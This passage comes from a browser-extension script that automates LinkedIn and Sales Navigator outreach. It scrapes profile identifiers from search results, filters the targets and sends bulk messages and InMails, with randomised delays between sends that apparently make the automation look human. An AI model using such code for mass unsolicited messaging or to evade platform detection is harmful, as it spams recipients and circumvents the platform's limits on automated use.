                                cont_div.find(".content-wrapper").prepend($('<span />', {
                                    'class': 'time_rem_span'
                                }).text(local_strings['ERR_CONN_REQ']));
                            } else if (cont_div.find(".bd").length > 0) {
                                cont_div.find(".bd").prepend($('<span />', {
                                    'class': 'time_rem_span'
                                }).text(local_strings['ERR_CONN_REQ']));
                            } else if(cont_div.find(".result-lockup__actions").length > 0) {
                                cont_div.find(".result-lockup__actions").append($('<span />', {
                                    'class': 'time_rem_span'
                                }).text(local_strings['ERR_CONN_REQ']));
                            }
                            currentIdx++;
                            startSending(currentIdx);
                        }
                    });
                }
            });
        })
    });
}

function startMessaging() {
    if (search_records_count < 1) {
        setupExtensionVars(function() {
            startMessaging();
        });
        return false;
    }
    checkForRandom(function(){
        setupExtensionVars(function() {
            updateLocalData(function(){
                var cont_div = $(".results-list > li").eq(currentIdx);
                if (isSalesNav) {
                    cont_div = $("#results-list > li").eq(currentIdx);
                }
                if(cont_div.length == 0){
                    cont_div = $(".search-results__list > li").eq(currentIdx);
                }
                if(cont_div.length == 0 && isSalesNav){
                    cont_div = $(".search-results .search-results__result-list li.search-results__result-item").eq(currentIdx);
                }
                // if($(".search-results li.search-result").length > 0){
                //     cont_div = $(".search-results li.search-result").eq(currentIdx);
                // }
                if (messagePremiumOnly) {
                    while (cont_div.find(".premium-icon, .premiumicon, .linkedin-premium-icon, .m-type--premium").length == 0 && currentIdx <= search_records_count) {
                        if(leonard_stopped){
                            break;
                        }
                        currentIdx++;
                        cont_div = $(".results-list > li").eq(currentIdx);
                        if ($("#results").length > 0) {
                            cont_div = $("#results > li[data-li-entity-id]").eq(currentIdx);
                        } else if ($("#results-list").length > 0) {
                            cont_div = $("#results-list > li").eq(currentIdx);
                        }
                        if(cont_div.length == 0){
                            cont_div = $(".search-results__list > li").eq(currentIdx);
                        }
                        if(cont_div.length == 0 && isSalesNav){
                            cont_div = $(".search-results .search-results__result-list li.search-results__result-item").eq(currentIdx);
                        }
                        // if($(".search-results li.search-result").length > 0){
                        //     cont_div = $(".search-results li.search-result").eq(currentIdx);
                        // }
                        if(cont_div.next().hasClass("search-result__occlusion-hint")){
                            var elOffset = cont_div.offset().top;
                            var elHeight = cont_div.height();
                            var windowHeight = $(window).height();
                            var offset;
                            if (elHeight < windowHeight) {
                                offset = elOffset - ((windowHeight / 2) - (elHeight / 2));
                            } else {
                                offset = elOffset;
                            }
                            $('html, body').animate({
                                scrollTop: offset
                            }, 100);
                            setTimeout(startMessaging, 1000);
                            return false;
                        }
                    }
                    if(leonard_stopped){
                        stopLeonard();
                        return false;
                    }
                }
                if (skipProfileWithNoPicMsg) {
                    while ((cont_div.find(".search-result__image img, .result-lockup__icon-link img").hasClass('ghost-person') || cont_div.find(".person-ghost").length > 0 || cont_div.find(".search-result__image-wrapper .ghost-person").length > 0) && currentIdx <= search_records_count) {
                        if(leonard_stopped){
                            break;
                        }
                        currentIdx++;
                        cont_div = $(".results-list > li").eq(currentIdx);
                        if ($("#results").length > 0) {
                            cont_div = $("#results > li[data-li-entity-id]").eq(currentIdx);
                        } else if ($("#results-list").length > 0) {
                            cont_div = $("#results-list > li").eq(currentIdx);
                        }
                        if(cont_div.length == 0){
                            cont_div = $(".search-results__list > li").eq(currentIdx);
                        }
                        if(cont_div.length == 0 && isSalesNav){
                            cont_div = $(".search-results .search-results__result-list li.search-results__result-item").eq(currentIdx);
                        }
                        // if($(".search-results li.search-result").length > 0){
                        //     cont_div = $(".search-results li.search-result").eq(currentIdx);
                        // }
                        if(cont_div.next().hasClass("search-result__occlusion-hint")){
                            var elOffset = cont_div.offset().top;
                            var elHeight = cont_div.height();
                            var windowHeight = $(window).height();
                            var offset;
                            if (elHeight < windowHeight) {
                                offset = elOffset - ((windowHeight / 2) - (elHeight / 2));
                            } else {
                                offset = elOffset;
                            }
                            $('html, body').animate({
                                scrollTop: offset
                            }, 100);
                            setTimeout(startMessaging, 1000);
                            return false;
                        }
                    }
                    if(leonard_stopped){
                        stopLeonard();
                        return false
                    }
                }
                if ((cont_div.length == 0 && finished_msgs_in_remaining > 0) || currentIdx > search_records_count - 1) {
                    chrome.storage.local.set({
                        nextPageRedirect: {
                            conns_count: finished_msgs_in_remaining
                        }
                    }, function() {
                        if ($(".next").length > 0) {
                            $(".next").trigger('click')
                        } else if ($(".next a").length > 0) {
                            window.location.href = location.origin + $(".next a").attr("href");
                        } else if (isSalesNav && $(".next-pagination").length > 0 && !$(".next-pagination").hasClass("disabled")) {
                            $(".next-pagination")[0].click();
                        } else if (isSalesNav && $(".search-results__pagination-next-button").length > 0) {
                            $(".search-results__pagination-next-button").click();
                        } else {
                            showNotification(local_strings['NO_PROFILES_TO_SEND_MSG']);
                            downloadCSVIfEnabled();
                            stopLeonard();
                            return false;
                        }
                        startNextPageTimer('message');
                    });
                    return false;
                }
                if (!local_data.selectedMessage) {
                    chrome.storage.local.set({
                        nextPageRedirect: false
                    });
                    return false;
                }
                if (cont_div.length == 0 || (!isSalesNav && cont_div.find("div > a:first").length == 0) || (isSalesNav && cont_div.find(".result-lockup__name").length > 0 && cont_div.find(".result-lockup__name a").length == 0)) {
                    activateThisTab(function() {
                        setTimeout(function() {
                            $("#start_sending_msg").text("STOP");
                            $("#start_sending_msg").addClass("started");
                            setStopLeonardBtn(true);
                            leonard_stopped = false;
                            startMessaging();
                        }, 1000);
                    })
                    // showNotification(local_strings['ACTIVATE_LINKEDIN']);
                    stopLeonard(true);
                    return false;
                }
                var elOffset = cont_div.offset().top;
                var elHeight = cont_div.height();
                var windowHeight = $(window).height();
                var offset;
                if (elHeight < windowHeight) {
                    offset = elOffset - ((windowHeight / 2) - (elHeight / 2));
                } else {
                    offset = elOffset;
                }
                $('html, body').animate({
                    scrollTop: offset
                }, 100);
                /* code for scrolling into view (ember bug)*/
                if (cont_div.hasClass("search-result__occlusion-hint")) {
                    setTimeout(startMessaging, 1000);
                    return false;
                }
                if(cont_div.find(".search-result__actions").length == 0 && cont_div.find(".content-wrapper").length == 0 && cont_div.find(".bd").length == 0 && cont_div.find(".result-lockup__actions").length == 0){
                    currentIdx++;
                    startMessaging(currentIdx);
                    return false;
                }
                
                var entityUrn, btnText, profile_link;
                if(cont_div.find("div > a:first").length > 0){
                    entityUrn = cont_div.find("div > a:first").attr("href").slice(4, -1);
                    profile_link = cont_div.find("div > a:first").attr("href");
                } else if(cont_div.find(".result-lockup__name a").length > 0){
                    profile_link = cont_div.find(".result-lockup__name a").attr("href");
                }
                if(profile_link){
                    var entityUrnMatch = profile_link.match(/sales\/.*?\/(.*?),/);
                    if(entityUrnMatch && entityUrnMatch.length > 0){
                        entityUrn = profile_link.match(/sales\/.*?\/(.*?),/)[1];
                    }
                }
                var tracking_id = cont_div.find("div > a").attr("data-control-id");
                var member_id;
                var view_url = cont_div.find("div > a:first").attr("href");
                if (isSalesNav) {
                    view_url = cont_div.find("a.name-link").length > 0 && cont_div.find("a.name-link")[0].href;
                    if(!view_url){
                        view_url = cont_div.find(".result-lockup__name a").attr("href");
                    }
                    if(cont_div.find(".result-lockup__message").length > 0){
                        btnText = cont_div.find(".result-lockup__message").text().trim();
                    } else if(cont_div.find(".m-type--message").length > 0){
                        btnText = cont_div.find(".m-type--message").text().trim();
                    } else {
                        btnText = cont_div.find("button.search-result__actions--primary").text().trim(); // In Some pages, Primary button is coming with Message
                        if(btnText != local_strings['MSG_BTN_TEXT']){
                            btnText = cont_div.find("button.send-message").text().trim();
                        }
                    }
                    member_id = cont_div.find("[name=memberId]").val();
                } else {
                    if (idUrnMapObj[tracking_id] && idUrnMapObj[tracking_id].member_id) {
                        member_id = idUrnMapObj[tracking_id].member_id.slice(14);
                    }
                    btnText = cont_div.find("button.search-result__actions--primary").text().trim();
                }
                if (view_url.indexOf('www.linkedin.com') == -1) {
                    view_url = 'https://www.linkedin.com' + view_url;
                }
                var comm_found_idx;
                if(recentComms){
                    recentComms.forEach(function(comm, idx) {
                        if(( ( comm.entityUrn == entityUrn ) || 
                            ( comm.profile_id == entityUrn ) || 
                            ( comm.member_id == member_id && member_id ) )){
                            comm_found_idx = idx;
                        }
                    });
                }
                cont_div.find(".time_rem_span").remove();
                if(isProfileSkipped(entityUrn) || isProfileSkipped(member_id)){
                    cont_div.find(".search-result__actions").prepend($('<span />', {
                        'class': 'time_rem_span'
                    }).text(local_strings['SKIPPED']));
                    if (isSalesNav && cont_div.find(".content-wrapper").length > 0) {
                        cont_div.find(".content-wrapper").prepend($('<span />', {
                            'class': 'time_rem_span'
                        }).text(local_strings['SKIPPED']));
                    } else if (cont_div.find(".bd").length > 0) {
                        cont_div.find(".bd").prepend($('<span />', {
                            'class': 'time_rem_span'
                        }).text(local_strings['SKIPPED']));
                    } else if(cont_div.find(".result-lockup__actions").length > 0) {
                        cont_div.find(".result-lockup__actions").append($('<span />', {
                            'class': 'time_rem_span'
                        }).text(local_strings['SKIPPED']));
                    }
                    cont_div.addClass("leo_skipped");
                    currentIdx++;
                    startMessaging(currentIdx);
                } else if (recentComms[comm_found_idx]) {
                    var already_sent_text = local_strings['MSGD_ALREADY_30'];
                    if(user_details.skipMessage){
                        already_sent_text = "Sent a message in the last "+user_details.skipMessage+" day(s)";
                    }
                    cont_div.find(".search-result__actions").prepend($('<span />', {
                        'class': 'time_rem_span'
                    }).text(already_sent_text));
                    if (isSalesNav && cont_div.find(".content-wrapper").length > 0) {
                        cont_div.find(".content-wrapper").prepend($('<span />', {
                            'class': 'time_rem_span'
                        }).text(already_sent_text));
                    } else if (cont_div.find(".bd").length > 0) {
                        cont_div.find(".bd").prepend($('<span />', {
                            'class': 'time_rem_span'
                        }).text(already_sent_text));
                    } else if(cont_div.find(".result-lockup__actions").length > 0) {
                        cont_div.find(".result-lockup__actions").append($('<span />', {
                            'class': 'time_rem_span'
                        }).text(already_sent_text));
                    }
                    cont_div.addClass("leo_skipped");
                    currentIdx++;
                    startMessaging(currentIdx);
                } else {
                    cont_div.find(".time_rem_span").remove();
                    if (btnText != local_strings['MSG_BTN_TEXT']) {
                        cont_div.find(".search-result__actions").prepend($('<span />', {
                            'class': 'time_rem_span'
                        }).text(local_strings['CANT_SEND_MSG']));
                        if (isSalesNav && cont_div.find(".content-wrapper").length > 0) {
                            cont_div.find(".content-wrapper").prepend($('<span />', {
                                'class': 'time_rem_span'
                            }).text(local_strings['CANT_SEND_MSG']));
                        } else if (cont_div.find(".bd").length > 0) {
                            cont_div.find(".bd").prepend($('<span />', {
                                'class': 'time_rem_span'
                            }).text(local_strings['CANT_SEND_MSG']));
                        } else if(cont_div.find(".result-lockup__actions").length > 0) {
                            cont_div.find(".result-lockup__actions").append($('<span />', {
                                'class': 'time_rem_span'
                            }).text(local_strings['CANT_SEND_MSG']));
                        }
                        cont_div.addClass("leo_skipped");
                        currentIdx++;
                        startMessaging(currentIdx);
                    } else {
                        cont_div.addClass("leo_visiting");
                        cont_div.find(".search-result__actions").prepend($('<span />', {
                            'class': 'time_rem_span'
                        }).text(local_strings['SENDING_MSG']));
                        if (isSalesNav && cont_div.find(".content-wrapper").length > 0) {
                            cont_div.find(".content-wrapper").prepend($('<span />', {
                                'class': 'time_rem_span'
                            }).text(local_strings['SENDING_MSG']));
                        } else if (cont_div.find(".bd").length > 0) {
                            cont_div.find(".bd").prepend($('<span />', {
                                'class': 'time_rem_span'
                            }).text(local_strings['SENDING_MSG']));
                        } else if(cont_div.find(".result-lockup__actions").length > 0) {
                            cont_div.find(".result-lockup__actions").append($('<span />', {
                                'class': 'time_rem_span'
                            }).text(local_strings['SENDING_MSG']));
                        }

                        var sendMessageToUser = function(attrs){
                            var firstName = attrs.firstName;
                            var lastName = attrs.lastName;
                            var publicIdentifier = attrs.publicIdentifier;
                            var profile_id = attrs.objectUrn;
                            var message_tags = $('#message_tags option:selected').length > 0 ? $('#message_tags option:selected').map(function() {
                                return $(this).text();
                            }).toArray().join(',') : '';
                            if (message_tags == "" && local_data.selectedTags.length > 0) {
                                var message_tags_arr = [];
                                tags.forEach(function(t) {
                                    if(local_data.selectedTags.indexOf(t.id) > -1){
                                        message_tags_arr.push(t.tag_name);
                                    }
                                });
                                message_tags = message_tags_arr.join(',');
                            }
                            sendPersonalMessage(attrs, function(is_error) {
                                if (is_error == 'error') {
                                    cont_div.find(".time_rem_span").remove();
                                    cont_div.addClass("leo_visit_error");
                                    cont_div.find(".search-result__actions").prepend($('<span />', {
                                        'class': 'time_rem_span'
                                    }).text(local_strings['ERR_SEND_MSG']));
                                    if (isSalesNav && cont_div.find(".content-wrapper").length > 0) {
                                        cont_div.find(".content-wrapper").prepend($('<span />', {
                                            'class': 'time_rem_span'
                                        }).text(local_strings['ERR_SEND_MSG']));
                                    } else if (cont_div.find(".bd").length > 0) {
                                        cont_div.find(".bd").prepend($('<span />', {
                                            'class': 'time_rem_span'
                                        }).text(local_strings['ERR_SEND_MSG']));
                                    } else if(cont_div.find(".result-lockup__actions").length > 0) {
                                        cont_div.find(".result-lockup__actions").append($('<span />', {
                                            'class': 'time_rem_span'
                                        }).text(local_strings['ERR_SEND_MSG']));
                                    }
                                    currentIdx++;
                                    startMessaging(currentIdx);
                                    return false;
                                } else if(is_error == 'already_sent_error'){
                                    var already_sent_text = local_strings['MSGD_ALREADY_30'];
                                    if(user_details.skipMessage){
                                        already_sent_text = "Sent a message in the last "+user_details.skipMessage+" day(s)";
                                    }
                                    cont_div.find(".time_rem_span").remove();
                                    cont_div.addClass("leo_visit_error");
                                    cont_div.find(".search-result__actions").prepend($('<span />', {
                                        'class': 'time_rem_span'
                                    }).text(already_sent_text));
                                    if (isSalesNav && cont_div.find(".content-wrapper").length > 0) {
                                        cont_div.find(".content-wrapper").prepend($('<span />', {
                                            'class': 'time_rem_span'
                                        }).text(already_sent_text));
                                    } else if (cont_div.find(".bd").length > 0) {
                                        cont_div.find(".bd").prepend($('<span />', {
                                            'class': 'time_rem_span'
                                        }).text(already_sent_text));
                                    } else if(cont_div.find(".result-lockup__actions").length > 0) {
                                        cont_div.find(".result-lockup__actions").append($('<span />', {
                                            'class': 'time_rem_span'
                                        }).text(already_sent_text));
                                    }
                                    currentIdx++;
                                    startMessaging(currentIdx);
                                    return false;
                                }
                                if (!is_error) {
                                    obj = attrs;
                                    obj.tags = message_tags;
                                    if(obj.tags){
                                        chrome.runtime.sendMessage({
                                            obj: obj,
                                            saveTags: true
                                        }, function(){
                                            
                                        });
                                    }
                                }
                                finished_msgs_in_remaining++;
                                local_data.currentIdx++;
                                currentIdx++;
                                local_data.REMAINING_MESSAGES--;
                                if (local_data.rm <= finished_msgs_in_remaining || local_data.REMAINING_MESSAGES <= 0) {
                                    clearInterval(nextViewInter);
                                    nextViewInter = null;
                                    clearTimeout(nextViewTimer);
                                    nextViewTimer = null;
                                    chrome.storage.local.set({
                                        nextPageRedirect: false
                                    });
                                    $("#start_sending_msg").text("SEND");
                                    $("#start_sending_msg").removeClass("started");
                                    updateMessageCount(function(){
                                        currentIdx = 0;
                                        // local_data.startedMessaging = false;
                                        local_data.rm = local_data.REMAINING_MESSAGES;
                                        local_data.selectedMessage = null;
                                        local_data.selectedMessageAttachments = [];
                                        updateLocalData(function() {
                                            chrome.runtime.sendMessage({
                                                removeBadge: true
                                            })
                                            // showNotification(local_strings['FINISHED_CONN_REQ_1'] + finished_msgs_in_remaining + local_strings['FINISHED_MSG_2']);
                                            notifyUser(local_strings['FINISHED_CONN_REQ_1'] + finished_msgs_in_remaining + local_strings['FINISHED_MSG_2']);
                                            cont_div.find(".time_rem_span").text(local_strings['MSG_SENT']);
                                            cont_div.removeClass("leo_visiting").addClass("leo_visited");
                                            updateLocalData();
                                            setStopLeonardBtn(false);
                                            stopLeonard(false);
                                        })
                                    });
                                    return false;
                                } else {
                                    updateMessageCount(function(){
                                        var RANDOM_TIMER = randomInRange(MIN_TIME_TO_NEXT, MAX_TIME_TO_NEXT);
                                        updateLocalData(function() {
                                            var end_timer = Date.now() + RANDOM_TIMER;
                                            if (nextViewInter) {
                                                clearInterval(nextViewInter);
                                                nextViewInter = null;
                                            }
                                            nextViewInter = setInterval(function() {
                                                if (!local_data.startedMessaging || ($("#start_sending_msg").length > 0 && !$("#start_sending_msg").hasClass("started"))) {
                                                    clearTimeout(nextViewInter);
                                                    nextViewInter = null;
                                                    return false;
                                                }
                                                var end_time = Math.round((end_timer - Date.now()) / 1000);
                                                if (end_time < 1) {
                                                    clearInterval(nextViewInter);
                                                    nextViewInter = null;
                                                }
                                                if (messagePremiumOnly) {
                                                    while (cont_div.find(".premium-icon, .premiumicon, .linkedin-premium-icon, .m-type--premium").length == 0 && currentIdx <= search_records_count) {
                                                        if(leonard_stopped){
                                                            break;
                                                        }
                                                        currentIdx++;
                                                        cont_div = $(".results-list > li").eq(currentIdx);
                                                        if ($("#results").length > 0) {
                                                            cont_div = $("#results > li[data-li-entity-id]").eq(currentIdx);
                                                        } else if ($("#results-list").length > 0) {
                                                            cont_div = $("#results-list > li").eq(currentIdx);
                                                        }
                                                        if(cont_div.length == 0){
                                                            cont_div = $(".search-results__list > li").eq(currentIdx);
                                                        }
                                                        if(cont_div.next().hasClass("search-result__occlusion-hint")){
                                                            var elOffset = cont_div.offset().top;
                                                            var elHeight = cont_div.height();
                                                            var windowHeight = $(window).height();
                                                            var offset;
                                                            if (elHeight < windowHeight) {
                                                                offset = elOffset - ((windowHeight / 2) - (elHeight / 2));
                                                            } else {
                                                                offset = elOffset;
                                                            }
                                                            $('html, body').animate({
                                                                scrollTop: offset
                                                            }, 100);
                                                            setTimeout(startMessaging, 1000);
                                                            return false;
                                                        }
                                                    }
                                                    if(leonard_stopped){
                                                        stopLeonard();
                                                        return false;
                                                    }
                                                }
                                                if (skipProfileWithNoPicMsg) {
                                                    while ((cont_div.find(".search-result__image img, .result-lockup__icon-link img").hasClass('ghost-person') || cont_div.find(".person-ghost").length > 0 || cont_div.find(".search-result__image-wrapper .ghost-person").length > 0) && currentIdx <= search_records_count) {
                                                        if(leonard_stopped){
                                                            break;
                                                        }
                                                        currentIdx++;
                                                        cont_div = $(".results-list > li").eq(currentIdx);
                                                        if ($("#results").length > 0) {
                                                            cont_div = $("#results > li[data-li-entity-id]").eq(currentIdx);
                                                        } else if ($("#results-list").length > 0) {
                                                            cont_div = $("#results-list > li").eq(currentIdx);
                                                        }
                                                        if(cont_div.length == 0){
                                                            cont_div = $(".search-results__list > li").eq(currentIdx);
                                                        }
                                                        if(cont_div.next().hasClass("search-result__occlusion-hint")){
                                                            var elOffset = cont_div.offset().top;
                                                            var elHeight = cont_div.height();
                                                            var windowHeight = $(window).height();
                                                            var offset;
                                                            if (elHeight < windowHeight) {
                                                                offset = elOffset - ((windowHeight / 2) - (elHeight / 2));
                                                            } else {
                                                                offset = elOffset;
                                                            }
                                                            $('html, body').animate({
                                                                scrollTop: offset
                                                            }, 100);
                                                            setTimeout(startMessaging, 1000);
                                                            return false;
                                                        }
                                                    }
                                                    if(leonard_stopped){
                                                        stopLeonard();
                                                        return false
                                                    }
                                                }
                                                end_time = end_time + " secs";
                                                cont_div.addClass("leo_visiting");
                                                cont_div.find(".time_rem_span").remove();
                                                cont_div.find(".search-result__actions").prepend($('<span />', {
                                                    'class': 'time_rem_span'
                                                }).text(local_strings['SENDING_MSG_IN'] + end_time));
                                                if (isSalesNav && cont_div.find(".content-wrapper").length > 0) {
                                                    cont_div.find(".content-wrapper").prepend($('<span />', {
                                                        'class': 'time_rem_span'
                                                    }).text(local_strings['SENDING_MSG_IN'] + end_time));
                                                } else if (cont_div.find(".bd").length > 0) {
                                                    cont_div.find(".bd").prepend($('<span />', {
                                                        'class': 'time_rem_span'
                                                    }).text(local_strings['SENDING_MSG_IN'] + end_time));
                                                } else if(cont_div.find(".result-lockup__actions").length > 0) {
                                                    cont_div.find(".result-lockup__actions").append($('<span />', {
                                                        'class': 'time_rem_span'
                                                    }).text(local_strings['SENDING_MSG_IN'] + end_time));
                                                }
                                            }, 1000);
                                            if (nextViewTimer) {
                                                clearTimeout(nextViewTimer);
                                                nextViewTimer = null;
                                            }
                                            nextViewTimer = setTimeout(function() {
                                                cont_div.find(".time_rem_span").remove();
                                                cont_div.removeClass("leo_visiting").addClass("leo_visited");
                                                cont_div.find(".search-result__actions").prepend($('<span />', {
                                                    'class': 'time_rem_span'
                                                }).text(local_strings['MSG_SENT']));
                                                if (isSalesNav && cont_div.find(".content-wrapper").length > 0) {
                                                    cont_div.find(".content-wrapper").prepend($('<span />', {
                                                        'class': 'time_rem_span'
                                                    }).text(local_strings['MSG_SENT']));
                                                } else if (cont_div.find(".bd").length > 0) {
                                                    cont_div.find(".bd").prepend($('<span />', {
                                                        'class': 'time_rem_span'
                                                    }).text(local_strings['MSG_SENT']));
                                                } else if(cont_div.find(".result-lockup__actions").length > 0) {
                                                    cont_div.find(".result-lockup__actions").append($('<span />', {
                                                        'class': 'time_rem_span'
                                                    }).text(local_strings['MSG_SENT']));
                                                }
                                                chrome.runtime.sendMessage({
                                                    setBadge: finished_msgs_in_remaining.toString(),
                                                    mode: 'message'
                                                });
                                                if (!local_data.startedMessaging || ($("#start_sending_msg").length > 0 && !$("#start_sending_msg").hasClass("started"))) {
                                                    clearTimeout(nextViewTimer);
                                                    nextViewTimer = null;
                                                    return false;
                                                }
                                                clearInterval(nextViewInter);
                                                nextViewInter = null;
                                                startMessaging(currentIdx);
                                            }, RANDOM_TIMER);
                                        });
                                    });
                                }
                            },false)
                        }
                        if(isSalesNav){
                            $.ajax({
                                url: view_url,
                                success: function(response) {
                                    // find profile identifier
                                    if(response.match(/profileId:(.*?),/)){
                                        var temp_entityUrn = response.match(/profileId:(.*?),/)[1];
                                        if(temp_entityUrn.length == 39){
                                            entityUrn = temp_entityUrn;
                                        }
                                    } else if(response.match(/sales\/.*?\/(.*?),/)){
                                        var temp_entityUrn = response.match(/sales\/.*?\/(.*?),/)[1];
                                        if(temp_entityUrn.length == 39){
                                            entityUrn = temp_entityUrn;
                                        }
                                    }
                                },
                                error: function() {
                                    cont_div.addClass("leo_visit_error");
                                    cont_div.find(".time_rem_span").remove();
                                    cont_div.find(".search-result__actions").prepend($('<span />', {
                                        'class': 'time_rem_span'
                                    }).text(local_strings['ERR_SEND_MSG']));
                                    if (isSalesNav && cont_div.find(".content-wrapper").length > 0) {
                                        cont_div.find(".content-wrapper").prepend($('<span />', {
                                            'class': 'time_rem_span'
                                        }).text(local_strings['ERR_SEND_MSG']));
                                    } else if (cont_div.find(".bd").length > 0) {
                                        cont_div.find(".bd").prepend($('<span />', {
                                            'class': 'time_rem_span'
                                        }).text(local_strings['ERR_SEND_MSG']));
                                    } else if(cont_div.find(".result-lockup__actions").length > 0) {
                                        cont_div.find(".result-lockup__actions").append($('<span />', {
                                            'class': 'time_rem_span'
                                        }).text(local_strings['ERR_SEND_MSG']));
                                    }
                                    currentIdx++;
                                    startMessaging(currentIdx);
                                },
                                async : false
                            });
                        }
                        visitProfile(entityUrn, function(attrs){
                            if(attrs){
                                sendMessageToUser(attrs);
                            } else {
                                cont_div.addClass("leo_visit_error");
                                cont_div.find(".time_rem_span").remove();
                                cont_div.find(".search-result__actions").prepend($('<span />', {
                                    'class': 'time_rem_span'
                                }).text(local_strings['ERR_SEND_MSG']));
                                if (isSalesNav && cont_div.find(".content-wrapper").length > 0) {
                                    cont_div.find(".content-wrapper").prepend($('<span />', {
                                        'class': 'time_rem_span'
                                    }).text(local_strings['ERR_SEND_MSG']));
                                } else if (cont_div.find(".bd").length > 0) {
                                    cont_div.find(".bd").prepend($('<span />', {
                                        'class': 'time_rem_span'
                                    }).text(local_strings['ERR_SEND_MSG']));
                                } else if(cont_div.find(".result-lockup__actions").length > 0) {
                                    cont_div.find(".result-lockup__actions").append($('<span />', {
                                        'class': 'time_rem_span'
                                    }).text(local_strings['ERR_SEND_MSG']));
                                }
                                currentIdx++;
                                startMessaging(currentIdx);
                            }
                        });
                    }
                }
            })
        })
    });
}

function startMailing() {
    var firstDegreeConn = false;
    if (search_records_count < 1) {
        setupExtensionVars(function() {
            startMailing();
        });
        return false;
    }
    checkForRandom(function(){
        setupExtensionVars(function() {
            updateLocalData(function(){
                var cont_div = $(".results-list > li").eq(currentIdx);
                if (isSalesNav) {
                    cont_div = $("#results-list > li").eq(currentIdx);
                }
                if(cont_div.length == 0){
                    cont_div = $(".search-results__list > li").eq(currentIdx);
                }
                if(cont_div.length == 0 && isSalesNav){
                    cont_div = $(".search-results .search-results__result-list li.search-results__result-item").eq(currentIdx);
                }
                // if($(".search-results li.search-result").length > 0){
                //     cont_div = $(".search-results li.search-result").eq(currentIdx);
                // }
                if (inMailPremiumOnly) {
                    while (cont_div.find(".premium-icon, .premiumicon, .linkedin-premium-icon, .m-type--premium").length == 0 && currentIdx <= search_records_count) {
                        if(leonard_stopped){
                            break;
                        }
                        currentIdx++;
                        cont_div = $(".results-list > li").eq(currentIdx);
                        if ($("#results").length > 0) {
                            cont_div = $("#results > li[data-li-entity-id]").eq(currentIdx);
                        } else if ($("#results-list").length > 0) {
                            cont_div = $("#results-list > li").eq(currentIdx);
                        }
                        if(cont_div.length == 0){
                            cont_div = $(".search-results__list > li").eq(currentIdx);
                        }
                        if(cont_div.length == 0 && isSalesNav){
                            cont_div = $(".search-results .search-results__result-list li.search-results__result-item").eq(currentIdx);
                        }
                        // if($(".search-results li.search-result").length > 0){
                        //     cont_div = $(".search-results li.search-result").eq(currentIdx);
                        // }
                        if(cont_div.next().hasClass("search-result__occlusion-hint")){
                            var elOffset = cont_div.offset().top;
                            var elHeight = cont_div.height();
                            var windowHeight = $(window).height();
                            var offset;
                            if (elHeight < windowHeight) {
                                offset = elOffset - ((windowHeight / 2) - (elHeight / 2));
                            } else {
                                offset = elOffset;
                            }
                            $('html, body').animate({
                                scrollTop: offset
                            }, 100);
                            setTimeout(startMailing, 1000);
                            return false;
                        }
                    }
                    if(leonard_stopped){
                        stopLeonard();
                        return false;
                    }
                }
                if (skipProfileWithNoPicMail) {
                    while ((cont_div.find(".search-result__image img, .result-lockup__icon-link img").hasClass('ghost-person') || cont_div.find(".person-ghost").length > 0 || cont_div.find(".search-result__image-wrapper .ghost-person").length > 0) && currentIdx <= search_records_count) {
                        if(leonard_stopped){
                            break;
                        }
                        currentIdx++;
                        cont_div = $(".results-list > li").eq(currentIdx);
                        if ($("#results").length > 0) {
                            cont_div = $("#results > li[data-li-entity-id]").eq(currentIdx);
                        } else if ($("#results-list").length > 0) {
                            cont_div = $("#results-list > li").eq(currentIdx);
                        }
                        if(cont_div.length == 0){
                            cont_div = $(".search-results__list > li").eq(currentIdx);
                        }
                        if(cont_div.length == 0 && isSalesNav){
                            cont_div = $(".search-results .search-results__result-list li.search-results__result-item").eq(currentIdx);
                        }
                        // if($(".search-results li.search-result").length > 0){
                        //     cont_div = $(".search-results li.search-result").eq(currentIdx);
                        // }
                        if(cont_div.next().hasClass("search-result__occlusion-hint")){
                            var elOffset = cont_div.offset().top;
                            var elHeight = cont_div.height();
                            var windowHeight = $(window).height();
                            var offset;
                            if (elHeight < windowHeight) {
                                offset = elOffset - ((windowHeight / 2) - (elHeight / 2));
                            } else {
                                offset = elOffset;
                            }
                            $('html, body').animate({
                                scrollTop: offset
                            }, 100);
                            setTimeout(startMailing, 1000);
                            return false;
                        }
                    }
                    if(leonard_stopped){
                        stopLeonard();
                        return false
                    }
                }
                if((isSalesNav && cont_div.find(".degree-icon").text().trim() != '1st') || cont_div.find(".dist-value").text().trim() != "1st"){
                    if(!sendUsingCredits){
                        while (cont_div.find(".openlink-badge, .m-type--open-link").length == 0 && currentIdx <= search_records_count) {
                            cont_div.find(".search-result__actions").prepend($('<span />', {
                                'class': 'time_rem_span'
                            }).text(local_strings['SKIPPED']));
                            if (isSalesNav && cont_div.find(".content-wrapper").length > 0) {
                                cont_div.find(".content-wrapper").prepend($('<span />', {
                                    'class': 'time_rem_span'
                                }).text(local_strings['SKIPPED']));
                            } else if (cont_div.find(".bd").length > 0) {
                                cont_div.find(".bd").prepend($('<span />', {
                                    'class': 'time_rem_span'
                                }).text(local_strings['SKIPPED']));
                            } else if(cont_div.find(".result-lockup__actions").length > 0) {
                                cont_div.find(".result-lockup__actions").append($('<span />', {
                                    'class': 'time_rem_span'
                                }).text(local_strings['SKIPPED']));
                            }
                            cont_div.addClass("leo_skipped");
                            currentIdx++;
                            cont_div = $(".results-list > li").eq(currentIdx);
                            if ($("#results").length > 0) {
                                cont_div = $("#results > li[data-li-entity-id]").eq(currentIdx);
                            } else if ($("#results-list").length > 0) {
                                cont_div = $("#results-list > li").eq(currentIdx);
                            }
                            if(cont_div.length == 0){
                                cont_div = $(".search-results__list > li").eq(currentIdx);
                            }
                            if(cont_div.length == 0 && isSalesNav){
                                cont_div = $(".search-results .search-results__result-list li.search-results__result-item").eq(currentIdx);
                            }
                            // if($(".search-results li.search-result").length > 0){
                            //     cont_div = $(".search-results li.search-result").eq(currentIdx);
                            // }
                        }
                    }
                }
                if(cont_div.find(".dist-value").text().trim() == "1st" || cont_div.find(".m-type--degree").clone().children().remove().end().text().trim() == "1st" || cont_div.find(".degree-icon").text() == "1st"){
                    firstDegreeConn = true;
                }
                if ((cont_div.length == 0 && finished_inms_in_remaining > 0) || currentIdx > search_records_count - 1) {
                    chrome.storage.local.set({
                        nextPageRedirect: {
                            conns_count: finished_inms_in_remaining
                        }
                    }, function() {
                        if ($(".next").length > 0) {
                            $(".next").trigger('click')
                        } else if ($(".next a").length > 0) {
                            window.location.href = location.origin + $(".next a").attr("href");
                        } else if (isSalesNav && $(".next-pagination").length > 0 && !$(".next-pagination").hasClass("disabled")) {
                            $(".next-pagination")[0].click();
                        } else if (isSalesNav && $(".search-results__pagination-next-button").length > 0) {
                            $(".search-results__pagination-next-button").click();
                        } else {
